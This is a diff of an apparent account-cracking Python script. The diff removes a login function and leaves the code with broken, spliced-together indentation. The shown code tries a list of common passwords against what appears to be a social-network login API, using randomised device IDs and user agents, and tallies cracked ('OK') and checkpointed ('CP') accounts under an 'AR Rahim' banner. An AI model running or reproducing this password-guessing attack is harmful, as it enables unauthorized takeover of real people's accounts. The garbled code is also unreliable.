@@ -528,25 +528,7 @@ def login2(uid):
         sys.stdout.flush()
         ua = random.choice(ugen)
         ua = windows()
-        
-
-                break
-            else:continue
-        loop+=1
-    except Exception as e:time.sleep(30)
-def login4(uid):
-    global oks,loop,cps
-    Session=requests.session()
-    try:
-        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mAR Rahim\33[38;5;37m-\x1b[38;5;46mS4\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
-        sys.stdout.flush()
-        ua = random.choice(ugen)
-        ua = windows()
-        for pw in ["123456","1234567","12345678","123456789","111222"]:
-            data = {'adid':str(uuid.uuid4()),
-            'format': 'json',
-	         'device_id':str(uuid.uuid4()),
-            'cpl': 'true',
+	    
             'family_device_id':str(uuid.uuid4()),
             'credentials_type': 'device_based_login_password', 
             'error_detail_type': 'button_with_disabled', 
